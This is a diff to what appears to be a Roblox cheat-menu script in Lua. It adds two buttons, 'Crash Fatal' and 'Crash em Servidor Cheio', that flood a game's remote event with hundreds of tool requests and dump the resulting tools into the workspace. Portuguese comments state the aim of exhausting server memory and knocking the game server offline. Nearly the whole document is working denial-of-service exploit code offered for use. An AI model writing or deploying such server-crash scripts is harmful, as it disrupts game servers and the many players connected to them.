@@ -649,6 +649,133 @@ MainTab:CreateButton({
         })
     end,
 })
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local StarterGui = game:GetService("StarterGui")
+local LocalPlayer = Players.LocalPlayer
+
+MainTab:CreateButton({
+    Name = "Crash Fatal (Loop de Estresse)",
+    Callback = function()
+        local remoteStorage = ReplicatedStorage:WaitForChild("RE", 10)
+        local toolRemote = remoteStorage and remoteStorage:FindFirstChild("1Too1l")
+        
+        if not toolRemote then 
+            StarterGui:SetCore("SendNotification", {Title = "Erro", Text = "Remote não encontrado", Duration = 3})
+            return 
+        end
+
+        StarterGui:SetCore("SendNotification", {
+            Title = "Ataque Iniciado",
+            Text = "Derrubando o servidor por exaustão de memória física...",
+            Button1 = "Ok",
+            Duration = 5
+        })
+
+        -- ATIVAÇÃO DO LOOP INFINITO DE DESTRUIÇÃO
+        _G.ServerCrasherActive = true
+        
+        task.spawn(function()
+            while _G.ServerCrasherActive and task.wait(0.1) do
+                local character = LocalPlayer.Character
+                local backpack = LocalPlayer:FindFirstChild("Backpack")
+                
+                if character and backpack then
+                    -- 1. Spam violento de ferramentas direto na fila de rede (200 por ciclo)
+                    for m = 1, 200 do
+                        task.spawn(function()
+                            toolRemote:FireServer("PickingTools", "FireHose")
+                        end)
+                    end
+                    
+                    -- Micro intervalo para o servidor computar a criação mas acumular na fila
+                    task.wait(0.2)
+                    
+                    -- 2. Equipamento e Descarte em massa misturados para gerar sobrecarga geométrica
+                    local items = backpack:GetChildren()
+                    for i = 1, #items do
+                        local item = items[i]
+                        if item:IsA("Tool") then
+                            -- Força o motor a anexar o item na mão e imediatamente desatrelar para a raiz do mapa
+                            task.defer(function()
+                                item.Parent = character
+                                item.Parent = workspace
+                            end)
+                        end
+                    end
+                end
+            end
+        end)
+    end,
+})
+
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local StarterGui = game:GetService("StarterGui")
+local LocalPlayer = Players.LocalPlayer
+
+MainTab:CreateButton({
+    Name = "Crash em Servidor Cheio",
+    Callback = function()
+        local remoteStorage = ReplicatedStorage:WaitForChild("RE", 10)
+        local toolRemote = remoteStorage and remoteStorage:FindFirstChild("1Too1l")
+        
+        if not toolRemote then return end
+
+        StarterGui:SetCore("SendNotification", {
+            Title = "Modo Servidor Cheio",
+            Text = "Iniciando injeção persistente e tolerante a lag...",
+            Duration = 4
+        })
+
+        -- Controla a execução mesmo se o ping subir para milhares de ms
+        task.spawn(function()
+            -- 1. Loop de Spam Direto (Garante o envio mesmo com atraso na resposta)
+            for m = 1, 535 do
+                task.spawn(function()
+                    if toolRemote:IsA("RemoteFunction") then
+                        toolRemote:InvokeServer("PickingTools", "FireHose")
+                    else
+                        toolRemote:FireServer("PickingTools", "FireHose")
+                    end
+                end)
+                -- Pausa ligeiramente maior em servidores cheios para evitar que o Roblox descarte seus pacotes por packet loss
+                if m % 30 == 0 then task.wait(0.05) end 
+            end
+            
+            -- Aguarda o buffer de rede descarregar no servidor lento
+            task.wait(1.5)
+
+            -- 2. Coleta e Descarte Direto Dinâmico
+            -- Em servidor cheio, NÃO usamos reset ou teletransporte complexo, pois o lag impede o personagem de carregar direito.
+            -- O descarte é feito em tempo real onde você estiver.
+            local character = LocalPlayer.Character
+            local backpack = LocalPlayer:FindFirstChild("Backpack")
+            
+            if character and backpack then
+                local items = backpack:GetChildren()
+                for i = 1, #items do
+                    local item = items[i]
+                    if item:IsA("Tool") and item.Name == "FireHose" then
+                        -- Usa defer para ignorar o travamento da sua própria tela e focar no servidor
+                        task.defer(function()
+                            item.Parent = character
+                            item.Parent = workspace
+                        end)
+                    end
+                end
+            end
+            
+            StarterGui:SetCore("SendNotification", {
+                Title = "Carga Despejada",
+                Text = "O servidor cheio deve cair em breve devido ao pico de ping.",
+                Duration = 5
+            })
+        end)
+    end,
+})
+
 -- ==========================================
 -- ABA 2: PAINEL ULTRA PRIVADO (Apenas se o ID for o do Dono)
 -- ==========================================
